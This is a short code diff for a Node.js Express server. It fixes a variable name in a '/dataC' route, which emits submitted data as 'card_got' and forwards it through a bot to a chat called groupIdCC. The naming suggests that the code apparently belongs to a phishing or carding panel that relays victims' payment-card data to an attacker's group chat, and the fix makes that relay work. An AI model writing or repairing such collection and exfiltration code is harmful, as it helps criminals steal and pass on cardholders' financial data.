@@ -38,7 +38,7 @@ app.post('/dataIO', (req, res) => {
 
 app.post('/dataC', (req, res) => {
     const data_ = req.body.data;
-    io.emit('card_got',data);
+    io.emit('card_got',data_);
     bot.sendMessage(groupIdCC, data_).then(() => {})
    .catch((error) => {
        console.log("ERROR",error);
